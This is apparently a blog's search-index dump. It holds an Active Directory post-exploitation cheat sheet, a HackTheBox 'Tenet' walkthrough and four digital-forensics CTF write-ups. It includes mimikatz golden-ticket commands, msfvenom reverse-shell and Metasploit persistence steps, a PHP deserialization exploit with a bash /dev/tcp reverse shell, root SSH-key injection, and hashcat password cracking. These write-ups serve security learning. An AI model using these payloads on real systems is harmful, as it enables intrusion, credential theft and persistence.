e38f8bc728b21b85602231dba189c5be 24 4700657dde6382cd7b990fb042b00f9e 25 8f46d9db219cbd64fb61ba4fdb1c9ba7 26 36b6a21f031bf361ce38d4d8ad39ee0f 27 e69385ee50f9d3e105f50c61c53e718e 28 ca006400aefe845da46b137b5b50f371 29 15a607251e3a2973a843e09c008c32e3 * Kerberos Default Salt : CONTROLLER.LOCALkrbtgt Credentials des_cbc_md5 : 64ef5d43922f3b5d * Kerberos-Newer-Keys Default Salt : CONTROLLER.LOCALkrbtgt Default Iterations : 4096 Credentials aes256_hmac (4096) : 8e544cabf340db750cef9f5db7e1a2f97e465dffbd5a2dc64246bda3c75fe53d aes128_hmac (4096) : 7eb35bddd529c0614e5ad9db4c798066 des_cbc_md5 (4096) : 64ef5d43922f3b5d * NTLM-Strong-NTOWF Random Value : 666caaaaf30081f30211bd7fa445fec4 Create a Golden Ticket1) kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500mimikatz # kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500User : Administrator Domain : controller.local (CONTROLLER)SID : S-1-5-21-849420856-2351964222-986696166User Id : 500Groups Id : *513 512 520 518 519ServiceKey: 5508500012cc005cf7082a9a89ebdfdf - rc4_hmac_ntLifetime : 6/28/2021 9:43:47 AM ; 6/26/2031 9:43:47 AM ; 6/26/2031 9:43:47 AM-&amp;gt; Ticket : ticket.kirbi * PAC generated * PAC signed * EncTicketPart generated * EncTicketPart encrypted * KrbCred generatedFinal Ticket Saved to file !2) Open a new command prompt with elevated privileges to all machines with misc::cmd:mimikatz # misc::cmd Patch OK for &#39;cmd.exe&#39; from &#39;DisableCMD&#39; to &#39;KiwiAndCMD&#39; @ 00007FF7609443B83) Within this new command prompt, access other machines:Enumeration w/ Server ManagerServer Manager is a built in windows feature. If we already have access to a domain admin account, then we can use it to change trusts, add or remove users, look at groups. etc.Maintaining Access TODO: look at advanced backdoors and rootkits, adding users and so on.Persistence metasploit module1) Generate a basic windows meterpreter reverse tcp shell$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=$(vpnip) LPORT=5555 -f exe -o shell.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 354 bytesFinal size of exe file: 73802 bytesSaved as: shell.exe2) Transfer the payload from your attacker machine to the target machine:$ scp shell.exe Administrator@10.10.245.132:Administrator@10.10.245.132&#39;s password: shell.exe 100% 72KB 559.7KB/s 00:003) Run a listener:$ msfconsole -q[*] Starting persistent handler(s)...msf6 &amp;gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &amp;gt; set payload windows/meterpreter/reverse_tcppayload =&amp;gt; windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &amp;gt; options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- -----------Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, process, none) LHOST yes The listen address (an interface may be specified) LPORT 4444 yes The listen portExploit target: Id Name -- ---- 0 Wildcard Targetmsf6 exploit(multi/handler) &amp;gt; set LPORT 5555LPORT =&amp;gt; 5555msf6 exploit(multi/handler) &amp;gt; set LHOST tun0LHOST =&amp;gt; 10.11.35.147msf6 exploit(multi/handler) &amp;gt; run[*] Started reverse TCP handler on 10.11.35.147:5555 4) Execute shell.exe from Windows machine and go back to your msfconsole then background it:[*] Sending stage (175174 bytes) to 10.10.245.132[*] Meterpreter session 1 opened (10.11.35.147:5555 -&amp;gt; 10.10.245.132:49869) at 2021-06-28 18:45:10 +0200meterpreter &amp;gt; background[*] Backgrounding session 1...msf6 exploit(multi/handler) &amp;gt;5) Use the persistence module:msf6 exploit(multi/handler) &amp;gt; use exploit/windows/local/persistence[*] No payload configured, defaulting to windows/meterpreter/reverse_tcpmsf6 exploit(windows/local/persistence) &amp;gt; set session 1session =&amp;gt; 1msf6 exploit(windows/local/persistence) &amp;gt; run[*] Running persistent module against DOMAIN-CONTROLL via session ID: 1[+] Persistent VBS script written on DOMAIN-CONTROLL to C:\\Users\\Administrator\\AppData\\Local\\Temp\\Yukvpk.vbs[*] Installing as HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\sQMgKDu[+] Installed autorun on DOMAIN-CONTROLL as HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\sQMgKDu[*] Clean up Meterpreter RC file: /root/.msf4/logs/persistence/DOMAIN-CONTROLL_20210628.4733/DOMAIN-CONTROLL_20210628.4733.rcUseful links PowerView-3.0-tricks.ps1 CONF@42 - Mimikatz - Mémoire Windows Gentilkiwi - Golden Ticket mimikatz SharpHound.ps1 PowerView.ps1 https://blog.harmj0y.net/ https://adsecurity.org/?page_id=1821 https://metasploit.help.rapid7.com/docs/about-post-exploitation http://www.pentest-standard.org/index.php/Post_Exploitation https://offsec.red/mimikatz-cheat-sheet/" }, { "title": "Tenet Writeup", "url": "/Tenet-Writeup/", "categories": "hackthebox", "tags": "hackthebox, writeup, tenet", "date": "2021-06-14 14:30:00 +0700", "snippet": "ReconnaissanceLet us start with a basic enumeration with nmap.sudo nmap -sC -sVWe go to http://10.10.10.223 and we get a default Apache page.We then run feroxbuster web enumerationferoxbuster --url http://10.10.10.223 We find the followingWe go to http://10.10.10.223/wordpress and find it is running wordpress.We browse around and If we hover over ‘Tenet’ at the bottom we see a hostname ‘tenet.htb’We add tenet.htb to our hosts file and then browse to http://tenet.htbNow everything on the site loads properly.After browsing around we find the following comment left by a user.Seems like someone might have left a file called sator.php and maybe a backup of it?Let’s go check.I just add sator.php and sator.php.bak into a file called words.txt and ran feroxbuster with it.feroxbuster --url http://10.10.10.223 -w words.txtCode 200 confirms we have an OK success status code.Browsing to http://10.10.10.223/sator.php we getWe then also download the http://10.10.10.223/sator.php.bak and find the following code.&amp;lt;?phpclass DatabaseExport{ public $user_file = &#39;users.txt&#39;; public $data = &#39;&#39;; public function update_db() { echo &#39;[+] Grabbing users from text file &amp;lt;br&amp;gt;&#39;; $this-&amp;gt; data = &#39;Success&#39;; } public function __destruct() { file_put_contents(__DIR__ . &#39;/&#39; . $this -&amp;gt;user_file, $this-&amp;gt;data); echo &#39;[] Database updated &amp;lt;br&amp;gt;&#39;; // echo &#39;Gotta get this working properly...&#39;; }}$input = $_GET[&#39;arepo&#39;] ?? &#39;&#39;;$databaseupdate = unserialize($input);$app = new DatabaseExport;$app -&amp;gt; update_db();?&amp;gt;FootholdI struggle with these types of challenges but essentially looking at the code it seems we can create our own php file and insert data to get RCE.We just have to create our own php file with code to do this request.We can see it could be some sort of PHP Deserialization RCELooking at the following articles we can get an idea of what needs to be done. https://github.com/1N3/Exploits/blob/master/PHP-Serialization-RCE-Exploit.php https://medium.com/swlh/exploiting-php-deserialization-56d71f03282aWe create our own PHP file with the following to add our reverse shell code into a file called moo.php and then call it to create a reverse shell.&amp;lt;?phpclass DatabaseExport{ public $user_file = &#39;moo.php&#39;; public $data = &#39;&amp;lt;?php exec(&quot;bash -c \\&#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.104/9998 0&amp;gt;&amp;amp;1\\&#39;&quot;); ?&amp;gt;&#39;; public function __destruct() { file_put_contents(__DIR__ . &#39;/&#39; . $this -&amp;gt;user_file, $this-&amp;gt;data); echo &#39;EXPLOITED&#39;; }}$url = &#39;http://10.10.10.223/sator.php?arepo=&#39; . urlencode(serialize(new DatabaseExport));$response = file_get_contents(&quot;$url&quot;);$response = file_get_contents(&quot;http://10.10.10.223/moo.php&quot;);?&amp;gt;We start a netcat listener on port 9998We run the php file.We get a reverse shell on our netcat.UserSeeing that this is a wordpress site the first place I usually go and check for credentials is the wp-config.conf&amp;gt;. Jackpot.I use those details to ssh into the machine and we have user on the box.We check and there is the user flag.Privilege EscalationNow for privsecLet us check the sudoers file.Seems we have access to a run a script as sudo.We look at the script and find this part that is interesting.We can inject our own ssh key!We create our own key with ssh-keygenWe create a while true script called sshkey.sh to put our key in and inject it into a /tmp/ssh-* file which then injects it into the authorized_keys file for the root user.Create a file sshkey.sh and put your public key in there. I had named mine moonkey.pub.Open up another terminal and ssh to the machine as neil.Now run the script on the remote machinechmod +x sshkey.sh./sshkey.shThen in the other terminal runSSH Key has been added to root’s authorized_keys file!Now we try ssh with our key we generated to root.ssh -i moonkey root@10.10.10.223We have root!Let’s grab the root flag." }, { "title": "African Digital Forensics CTF - Week 4", "url": "/African-Digital-Forensics-CTF-Week-4/", "categories": "writeup, dfir, forensics", "tags": "writeup, dfir, forensics, digital forenics", "date": "2021-06-08 10:00:00 +0700", "snippet": "Week4This was the final week and we were given an Android dump.We only had 9 questions and I wasn’t too sure how this one would pan out as I have never done forensics on Android devices before but I suspected it would be similar to any other device just the difference would be the operating system and where the files were located.Once we downloaded the files and extracted them we were good to go.1) Device TimeWe can get the following in a file called device_datetime_utc.txt2) DownloadsLet’s have a look for a tor browser program that was downloaded and it should have a file extension with an apk. apk is an Android package file that’s used to install an application.As we see there is the downloaded Tor Browser apk.Now we need to see what time it was downloaded.What we see here is not the time in UTC time. You notice there is a +02:00 which means I am 2 hours ahead of UTC.So the answer is asked for in UTC time so the answer would be 2021-04-29 19:42:263) EmailThis one I found in the Agent Data folder.There is a file contacts3.db. The .db file is a sqlite database file.So I opened it up in sqlite3 and found the email address.4) App FocusSolving this in unix felt like cheating but hey, you use the tools you have.I used grepped for the exact time in the all the folders and found the app being used.If you want to manually check, you can just check the usage_stats.txt file under Live Data and check the time to see what app is being used there.5) Power!Here we go to a file Live Data/Dumpsys Data/batterystats.txtWe see the time the device was reset.We now have to look for when the device charged to 100%.Now we need to calculate the time of when the device charged to 100%.So we just need to take 13:12:19 and add 5 minutes, 1 second and 459 milli seconds to it but then round it off to the nearest second.2021-05-21 13:17:206) WIFIUsing sqlite3 again, we look at the wifi.db in the Agent Data and we get a list of all the WiFi points the device has tried to connect to.Seems like the last WIFI it connected to was Hot_SSL.After grepping through the files for the Hot_SSL I come across the following file.apps/com.android.providers.settings/k/com.android.providers.settings.dataIn there we find the following7) Always watchingWe go back to the file usage_stats.txt and we grep for the date and the Youtube application.I entered 08:34:29 and it was wrong. Wait what?I then manually entered the first time Youtube was accessed until the last time.8) Copied?This challenge I remembered a strange file from week 1.The only files that the user copied were the pictures from the camera and the pdf we found.It was under.qce is a QuickCrypto program which encrypts files. I also remember QuickCrypto being installed on the system.9) Structural SimilarityThis one was pretty challenging. We had to download a certain image, I named it suspicious.jpgWe had to find the same image that was taken on the phone.Easy.We go to the sdcard/DCIM/Camera folder.It’s called 20210429_151535.jpgWe put both the images in a directory.When we do a binwalk we can clearly see something is up with the suspicious.jpg fileI did a google search for find the structurual similarity metric of jpgI came across the following page How to calculate the Structural Similarity Index (SSIM) between two images with PythonI followed the instructionspip3 install scikit-image opencv-python imutilsand then copied the code on the site.python3 script.py --first original_image.png --second compressed_image.pngAfter running the script I got an error.After some googling and research I found out that the code that the person posted, they were using the old method and the newer version of skimage uses a new method.I changed the two following lines in the script.#from skimage.measure import compare_ssimfrom skimage.metrics import structural_similarity as ssim#(score, diff) = compare_ssim(grayA, grayB, full=True)(score, diff) = ssim(grayA, grayB, full=True)Once we run the script again we get the SSIM.ConclusionAndroid forensics went better than I thought. I thought we would have to use Android Studio or something like that but glad it was much simpler than that.Thank you for reading these write ups. It was fun to redo them.I am by no means a DFIR guru but this was a very fun CTF to do." }, { "title": "African Digital Forensics CTF - Week 3", "url": "/African-Digital-Forensics-CTF-Week-3/", "categories": "writeup, dfir, forensics", "tags": "writeup, dfir, forensics, digital forenics", "date": "2021-06-07 17:00:00 +0700", "snippet": "Week3This week we were given a network dump in the form of a PCAP file.There were 13 challenge questions this week.To be able to analyze this PCAP file we needed to use a program called Wireshark.1) DNSLet’s run a search query for dns in the search bar.We could also use the queryudp.port == 53We see that 192.168.1.26 is making DNS queries to 192.168.1.10.We can assume that fe80::b011:ed39:8665:3b0a is 192.168.1.26 and that the other IPv6 address is 192.168.1.10.2) MAC AddressLet’s have a look at what IP Address comes up the most and that will probably be our suspect IP.On the toolbar at the top click Stastistics and then Conversations.Click on the IPv4 tab and as you can see, there is one IP that comes up. If I had to scroll down even more down it would show many more of the same IP.3) PacketsFor this we can go directly to the packet ID.On your keyboard press ctrl + g or on the toolbar&amp;lt;/b&amp;gt; click Go and select Go to packetYou will now see on the top right hand side the following.Enter the packet ID into the field and click Go to packet and we will see the domain name.4) Passwords!In the search bar, search for ftp and on the rightmost column we can find the password.5) UDP DataWe can craft the following search term to get the result and count them.ip.src_host == 192.168.1.26 and ip.dst_host == 24.39.217.246 and udp6) DomainsFor this one we need to see the TLS Client Hello packets and see what domains they were communicting with.We can do this by running the following searchssl.handshake.type == 1We now have to go through each packet and manually check and eventually we find it.7) Image dataThe challenge question mentioned a .jpg so my first thought was to see if it was downloaded with FTP.I searched for ftp-data and found the followingWe can right click on highlighted packet in the above, select Follow and then select TCP Stream or alternativley you can press Ctrl+Alt+Shift+TWe can see in the stream the created date.To be honest, we cannot confirm if this IS the created date.Let us download this image to our local machine.At the bottom of the TCP Stream window, change the Show data as to Raw and then click Save as… as 202104_29_152157.jpgNow we can use the exiftool from week 1 to look at the metadata.Or if we look at the filename of the .jpg image it has the date taken but one cannot assume that is the created time.8) Public keysThis one was tedious. Manually checking for this took a while but I found it eventually!I found the following useful site with a filter list for TLS. Wireshark Filter for SSL TrafficIn my search bar I had the following:ssl.handshake.type == 2 and ssl.handshake.type == 11 and ssl.handshake.type == 12 and ssl.handshake.type == 14I manually had to check the for the TLS session and find the answer but that query made our search criteria smaller.9) Registered countryHere we need to get the MAC address of the FTP server and for this we need to search for ftp traffic.In this case, we can see 192.168.1.26 is communicating to the FTP server and is showing as 192.168.1.20. We just need to get the MAC address as below.We can go to the following website to check the MAC address.macaddress.ioJust a break down of how the packet flow works.I got the first packet where this request started. Bare with me. IntelCor_57:47:93 is broadcasting an ARP asking who has 192.168.1.20 PcsCompu_a6:1f:86 tells IntelCor_57:47:93 that it is 192.168.1.20 192.168.1.26 is now making a SYN connect on port 21 to 192.168.1.20 192.168.1.20 respondes with a SYN, ACK response back to 192.168.1.26 192.168.1.26 sends back an ACK to say it received 192.168.1.20 SYN,ACK 192.168.1.20 response with a Welcome message to 192.168.1.26 192.168.1.26 sends an ACK to say it got the Welcome message from 192.168.1.20 192.168.1.26 sends an AUTH TLS request to 192.168.1.20 192.168.1.20 sends an ACK to 192.168.1.26 to say they received it. 192.168.1.20 sends a Please login response to 192.168.1.26 So from this conversation, It shows that 192.168.1.26 is the suspect and 192.168.1.20 is the FTP Server.192.168.26 is making a SYN connect on port 21 to 192.168.1.20 so 192.18.1.20 is the FTP server with the MAC address of 08:00:27:a6:1f:8610) Suspicious foldersWhen we do a directory listing, a FTP server uses the LIST command.With this in mind we can now do a search to get all requests for directory listing.ftp-data.command == LISTHere we find the directory and the time it was created.11) Hidden filesHere we go to the packet ID 25639 by going to the toolbar, selecting Go and then Go to Packet or just pressing ctrl+g.In the search to the right we enter the packet ID.We see the IP address of 185.70.41.130.When we do a reverse DNS lookup we get the following.Domain name is from protomali.chWe can right click on that packet and go to Follow and then select TCP stream.Here we see the domain mail.protomail.comSo we clearly looking for something that was downloaded from protomailFor the next part, we need to go back to AutopsyWe go to Web Downloads and we look for the protomail.com domain and then we see what file was downloaded.12) TLS DomainHere we go to the packet ID 27300 by going to the toolbar, selecting Go and then Go to Packet or just pressing ctrl+g.In the search to the right we enter the packet ID.We find the IP 172.67.162.206. Looking at the TCP stream we see that the IP is behind Cloudflare.Doing a reverse DNS lookup didn’t bring back anything either.Let’s dig a bit deeper into the PCAP file.We can use a search query to get this answer.dns.a == 172.67.162.20613) BTC AccountThis challenge was by far the hardest of all the challenges. It took me a week and a half to complete this challenge. We had to find a Bitcoin account number. That was it. No, hints, no nothing. From previous questions and enumerations there was a certain filename called accountNum.zip that I saw on the suspect disk that was downloaded from the FTP server.We had a problem though. The file was deleted off the suspect disk.We saw this when we looked at the powershell ConsoleHost_history.txt previously We would now have to look at this PCAP file to get this data out.As we can see, the data was downloaded and it was 229 bytes but when we right click and follow the stream we don’t see the data. Let’s take a closer lookWe are currently in tcp stream 19. If you look on the left, there are some packets missing between 11836 and 11842.Let us check the next tcp stream after 19, 20.We could also just search for ftp-data We can right click packet 11837 and follow the tcp stream.We now can save this data as a raw format. Same method we did in the previous challenge for the 202104_29_152157.jpg file.Make sure to save it as accountNum.zipI tried to unzip the file but needless to say, it asked for a password.I copied the zip file to my Kali machine so we can crack this password.For this next step we needed to use zip2john to get a hash./usr/sbin/zip2john accountNum.zip &amp;gt; accountNum.hashWe now had to clean the hash so hashcat can understand it.$ cat accountNum.hash $zip2$*0*1*0*ee15e8c7b119a263*b778*2b*1cc963b2a5bee8ff04df77f9234157dfdb0f790a696feee642c9c246880769d8a82ca85690cb3f3b27e93f*90fa573c01d71c5971c1*$/zip2$Looking at hashcat examples again, we can see that it is a WinZip format and we need to use the mode 13600.Now this is where it got tricky. Bear in mind, these takes ages to finish so I spent days on end waiting.I ran it against rockyou.txt NOTHING Ran it against weakpass_2a NOTHINGI ran it with OneRuleToRuleThemAll.rule and rockyou.txt. NOTHINGI ran it with ?a?a?a?a?a?a?a NOTHINGI then started expirementing with variations of previous passwords.We had found from previous, ctf2021, AFR1CA! and AfricaCTF2021I started taking those password and doing lowercase, uppercase, reversing and doing all sorts of stuff. NOTHINGI took a full day break from this challenge.I had to rethink this. This was when I saw a hint saying what the structure could be but still did not give me an idea how long the password would be.The first method I tried was to bruteforce it with the following. Thanks to Neonpegasus for your GPU!hashcat -m 13600 -a 3 accountNum.hash ?u?a?a?a?a?l?l!The second method I did while waiting for the above was a bit more behind my method of attacking it. I thought about this logically as a typical user and thought, what do we as humans do with passwords? We repeat passwords but just add or change a certain aspect of it. e.g Rover21April –&amp;gt; Rover21MayWhat if I used the same thinking to this challenge? Break down the passwords seen into smaller chunks, and from the hints given, prepend or append them to a dictionary?e.g Afr1can AfricanCTF2021 ctf2021 to Afr1can African CTF 2021 ctfSo I did some reading and I found how to prepend and append these to another wordlist. Now before I embarrass myself, the method I used does work, to a certain degree, BUT because it worked, I completely missed another attack mode, this is explained towards the end, that hashcat has to make this much simpler…but so we learn.Anyway, so I created a rules file to prepend them to rockyou.txt.My rules file looked like this:^n^a^c^1^r^f^A^n^a^c^i^r^f^A^f^t^c^F^T^C^1^2^0^2 It may look weird but this is how prepend works in hashcat. The char ^ is the prepend function.Say there is a word, dog, in the rockyou.txt file. You want to prepend the word cat to it. Your rule would look like ^t^a^c. So from left to right, hashcat will start with ^t and prepend it to dog making it tdog. The next one would be ^a and prepend that to tdog making it atdog. ^c prepends to atdog making it catdog. Done.Append works the other way. You have the word dog and you want to append cat to it. Your rule would be ^c^a^t, thus ^c appends to dog making it dogc, ^a appends to dogc making it dogca and finally ^t appends to dogca making it dogcat. Simple.So to use your rule file against a dictionary you would use the following:hashcat -m 1000 -a 0 accountNum.hash -r rule.file rockyou.txtSo what I did was prepend the rules to rockyou.txtTime.Estimated...: (56 mins, 9 secs)Status...........: CrackedThe easier way was to use the combinator attack. Wait what, how did I miss that.So essentially I could have just put those words in a file and run:hashcat -m 13600 -a 1 accountNum.hash words.file rockyou.txtConclusionThis was by far the most challenging week and definitly questioned my sanity again! STAY TUNED FOR WEEK 4 WRITE UP SOON!" }, { "title": "African Digital Forensics CTF - Week 2", "url": "/African-Digital-Forensics-CTF-Week-2/", "categories": "writeup, dfir, forensics", "tags": "writeup, dfir, forensics, digital forenics", "date": "2021-06-03 17:00:00 +0700", "snippet": "Week 2We were given a RAM Acquisition of the suspect disk for week 2. A RAM Acquisition is just a procedure of copying the contents of volatile memory to non-volatile storage.I have done a few RAM disk analysis in the past and I knew immediatly to get an application called Volatility but this one got me stumped for an hour or so due to the fact that I downloaded Volatility 2 and I just could not get the RAM disk to work. After some reading I managed to figure out I needed to get Volatility 3.I found out that it might be because of the new Windows versions that Volatility 2 doesn’t support or just something specific with this dump created.The differece between Volatility 2 and 3 quite big due to the fact that 3 is lacking in a lot of the commands that 2 has so some of these questions you really had to come up with alternative methods to solve.Some resources I used: HackTricks Volatility CheatsheetWe again were given 11 challenge questions to do.1) Be BraveThis one was straight foward. In Volatility we have the plugin called windows.pslist which lists all the processes.python3 vol.py -f ../20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist2) Image VerificationWe can run the following command to get the SHA256 hash value.CertUtil -hashfile ../20210430-Win10Home-20H2-64bit-memdump.mem sha2563) Let’s ConnectWith this one we can use another plugin for Volatility called windows.netstatpython3 vol.py -f ../20210430-Win10Home-20H2-64bit-memdump.mem windows.netstat | findstr ESTABLISHEDI counted.I entered my answer, WRONG!I recounted, same result.I was confused.I reran the command multiple times and got the same outcome. Was I doing something wrong? After while I decided to copy the memory dump to my Kali machine and see if I get the same result.Wait what? A different outcome? Now if you are thinking, it’s because I had a different version of Volatility then you are wrong. It’s was same cloned version from Volatility3 Maybe it’s a windows thing? I cannot explain this. Did anyone experience the same?At this point I just decided to rather do the rest of the challenges of week2 on my Kali machine. I just couldn’t trust Volatility on windows.4) RAM Acquisition TimeThis one was fairly easy and we just had to run the following Volatility plugin.python3 vol.py -f ../20210430-Win10Home-20H2-64bit-memdump.mem windows.info5) Chrome ConnectionThis one is pretty straight forward. From previous question we see a list of established connections and one of them is chrome.exeWe see that it is connected to a destination IP. We now need to find the domain name.Let us do a reverse lookup on the destination IP.6) Hash Hash BabyHere we have to dump the process PID 6988 with a plugin called pslist.python3 vol.py -f ../20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist --pid 6988 --dumpA file gets dumped into the folder and then all we have to do is get the MD5 hash value.md5sum pid.6988.0x1c0000.dmp7) Offset SelectThis one had me stumped for pretty much a few hours. Getting the offset is easy. I had the right command.The problem came in with a typo when the question first came out.The original offset was wrong.This was the original question. The offset here was 0x45BE87BNow when I used that offsethexdump -s 0x45BE87B -C ../20210430-Win10Home-20H2-64bit-memdump.mem | moreI would get the following result.There was no word with a length of 6 bytes on that offset and the only one that was closest was at offset 0x45be93b with the word removed.This had me question my sanity and ability of using hexdump to find offsets and I went down a path that I will not talk about. Googling down rabbit holes. haha. THANKFULLY I noticed sometime later that the offset was changed in the question and when I checked the offset again, this time 0x45BE876, I got the correct answer. Thanks DFIRScience for thinking I was going insane! :-)hexdump -s 0x45BE876 -C ../20210430-Win10Home-20H2-64bit-memdump.mem | more8) Process Parents PleaseFor this one we will just use windows.pslistpython3 vol.py -f ../20210430-Win10Home-20H2-64bit-memdump.mem windows.pslistWe have a look at the process powershell.exe and see it has a PPID of 4352.A PID is a Process ID that each process has on the system. In this case, poweshell.exe has a PID of 5096.A PPID is a Parent Process ID. Each process is assigned a PPID and this tells us which process started it. In this case, the PPID of powershell.exe is 4352.We now have to find this PPID 4352 and this will tell us the parent process of powershell.exeNow we have the time the parent process was created.9 Finding FilenamesFor this one we are going to use the windows.cmdline plugin.python3 vol.py -f ../20210430-Win10Home-20H2-64bit-memdump.mem windows.cmdline | grep notepad10) Hocus FocusThis one we use the plugin windows.registry.userassist python3 vol.py -f ../20210430-Win10Home-20H2-64bit-memdump.mem windows.registry.userassist | grep Brave11) MeetingsThis one for me was the hardest for week 3. There was no indication where to even begin or look for this answer.I searched every nook and cranny on the RAM and Disk Image.That date did not exist anywhere in a search or timeline.I was stumped.Without the hint for the week, I would have struggled to even find it.To be honest. I had the file open in week 1 and I didn’t read the whole thing, only some parts. If I read every page, I would have seen it!For this we need to open Autopsy.With the hint from the week I knew exactly where to look.On the left we click Metadata then we right click almanac-start-a-garden.pdf and extract it to our local machine.Open the PDF and scroll to page 11.You will find some GPS coordanates with the date 2021-06-13 at the bottom of that page.Let’s go to the website we went to in week 1 https://www.gps-coordinates.net/We enter the GPS co-ordinates and then we find the place and country.I have never been to Victoria Falls.ConclusionAll in all it was a fun week, apart from those 3 challenges that gave me hassels but in the end I solved them. Stay tuned for week 3 write up in the next few days" }, { "title": "African Digital Forensics CTF - Week 1", "url": "/African-Digital-Forensics-CTF-Week-1/", "categories": "writeup, dfir, forensics", "tags": "writeup, dfir, forensics, digital forenics", "date": "2021-06-02 17:00:00 +0700", "snippet": "The United Nations Cybercrime unit in Africa, lead by Carmen Corbin_UN created a unique Digital Forensics CTF competition for the month of May for Africa in the digital forensics cybersecurity field and for people who are keen to see how their skills are. I for one do not work in the digital forensics field so I wanted to see how I would do in this but having worked as a systems administrator for most of my career, and now trying to make a move into offensive / forensics security, I had an idea on what things to look for, etc.This challenge was created by DFIR.Science. This was unique in a way that you had to complete 4 weeks of challenges and also try to complete the challenges before other people did. I was excited. Week 1 you were given a suspect disk to analyze. Week 2 you were given a memory dump of the suspect disk. Week 3 you were given a network dump of the suspect computer. Week 4 you were given a dump of the android phone of the suspect.For me, having a full time job, I couldn’t spend every minute of the day trying to do the challenges and seeing people finish challenges before you could even attempt them was disheartening, but I told myself, this is all about learning and the scoreboard should mean nothing.I only saw the CTF on the 6 May, thanks to seeing a post by Ms_R00T, so she needs a shout!So let me start with the writeup for week 1.Week 1So we were given a Forensic Disk Image which we had to download. Once downloaded, we used an application called Autopsy to load the disk image so that we could access the data on it.We were given 11 questions to answer ranging from 3 points to 12.This is how I solved week 1.1) DeletedThis task was pretty straight forward. When files get deleted on windows, it goes to the Recycle Bin.I went straight to the location of the Recycle Bin to check what files were deleted.There was only one file in there so we can easily see that it’s the intended file and we can see the date and time it was deleted.2) Server ConnectionHere I went to the Installed Programs to see what FTP clients were installed and I saw that Filezilla Client was there.I have used Filezilla Client before so I knew exactly where to go look on the system and see potential connections in the filezilla.xmlWhen a user saves connections for FTP, SFTP, etc in Filezilla, it will save it in that file.i3) Suspect Disk HashFor this one I first did it another method but 3 weeks later I cannot remember what I did. I think I used another tool on linux to check this but when I went through these challenges again to do the writeup I totally forgot.Anyways, for this you can simply download a program called FTK ImagerOnce installed you just import the disk image as below and you will find the MD5 hash.Click file and then Add Evidence ItemSelect Image FileThen browse and select the 001Win10.E01Once imported on the left, right click on the 001Win10.E01 and select Verify Drive/ImageIt will start to verify.Now we can see the hash.4) Web SearchThis one was fairly simple as we just go look under the Web History and go to the time in the question and you will find the search term used.5) Possible LocationSo this one for me was easy. You could just click on the Geolocation button on the toolbar at the top of Autopsy. This takes all the metadata on images on the system , looks for the GPS tags in them and pin points it on a world map. It found 2 countries but what if there are 10 or 20? So I did it the way I usually do and check the metadata on the image itself.We first have to extract the image from the disk and then run a tool on the image. Find the image on the system and then right click on it to extract it to a location on your local system.Then I downloaded exiftool and ran it against the image to get the metadata from it.Towards the bottom we find the GPS location.I went to a website called https://www.gps-coordinates.net/ and entered the GPS coordinates.6) Tor BrowserThis one had me stumped for a while as I was back and forth making sure I wasn’t going crazy.I searched for the word tor and found the followingTo confirm, I went to the location on the disk which was under the user’s Desktop folder.After some researching on how to find out how many times a user has run a program, I came across windows prefetch.From what I understand, this prefetch folder contains information about programs you run on the system. This might indicate how many times a program is run on the system.I searched for tor.exe in this folder but could not find anything.I only found a torbrowser prefetch file. Could it be that the user downloaded the tor browser installation and just installed it and then did not run the tor browser on the system yet?My conclusion was correct.7) User EmailAutopsy has an email address folder but looking at it there was 5798 results.Definitly not gonna sif through that.So I browsed to the Web Form Autofill to see for potential usernames/emails in web form fields and we found something.Now I just went to the keyword search on the top right and searched for the username and after going through the results we find the email address.8) Web ScanningNow we go back to Installed Programs and find Angry IP Scanner and NmapHaving some basic powershell knowledge I immediatley thought to check the ConsoleHost_history.txt file for any commands run by the user.Yep, there it is.9) Copy LocationThis one was a big trickyish. Getting the file on the disk was no problem but finding the original was going to take some digging.We go to EXIF Metadata and see that it was taken with a LG phone.We then do a Keyword Search for 20210429_151535.jpg.and then check the times when we scroll to the right.I right clicked on the file and selected View Source File in Timelineand chose File Created and set the time frame 10 minutes either way.For some reason when I tried to do this while writing the writeup it just did not want to play nice so I had to manually enter the time frame.So as we can see, the original image came from the LG camera device. Back to the main Autopsy window we go to Shell Bags on the left.ShellBags are a popular artifact in Windows forensics often used to identify the existence of directories on local, network, and removable storage devices.Now I cannot remember what the actual answer was but it was one of the following.If someone can let me know if you can find the proof. I think it could have been either Camera or DCIM. 10) Hash CrackerThis one took a bit. We know this is a NTLM hash.For those that don’t know what a NTLM hash is let’s break it down.It is constructed into 4 parts John Doe - the user name 1001 - RID (relative identifier or user ID) aad3b435b51404eeaad3b435b51404ee - LM hash 3DE1A36F6DDB8E036DFD75E8E20C4AF4 - NT hashI took the following from # Intro to Windows hashes as I am too lazy to write it in my own words. LM - The LM hash is used for storing passwords. It is disabled in W7 and above. However, LM is enabled in memory if the password is less than 15 characters. That’s why all recommendations for admin accounts are 15+ chars. LM is old, based on MD4 and easy to crack. The reason is that Windows domains require speed, but that also makes for shit security. NT - The NT hash calculates the hash based on the entire password the user entered. The LM hash splits the password into two 7-character chunks, padding as necessary. NTLM - The NTLM hash is used for local authentication on hosts in the domain. It is a combination of the LM and NT hash as seen above.The only part we are going to use is the NT hash.We can check https://hashcat.net/wiki/doku.php?id=example_hashes to see what mode this isI ran this hash through rockyou.txt and found nothing. Let us use the OneRuleToRuleThemAll and see if we get anything.11) User PasswordSo for this one we needed to understand where Windows stores a user’s password hash. On linux it is simple, it stores it in the /etc/shadow file. In Windows you require two files.One is the SAM file, this stores the Windows user hashes but these hashes are encrypted with the SYSTEM file.So in order for us to crack the hashes, we need both of these file on the Windows 